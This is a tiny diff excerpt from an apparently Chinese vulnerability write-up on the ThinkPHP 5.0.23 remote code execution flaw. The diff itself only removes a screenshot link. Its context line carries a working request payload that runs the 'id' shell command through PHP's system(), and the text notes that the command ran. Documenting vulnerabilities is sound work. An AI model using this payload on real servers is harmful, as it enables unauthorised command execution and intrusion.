@@ -42,7 +42,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 成功执行 `id` 命令：
 
-![image-20220302151553822](./.resource/ThinkPHP5-5.0.23-远程代码执行漏洞/media/202203021515902.png)
+
 
 
 ## 开源 POC/EXP
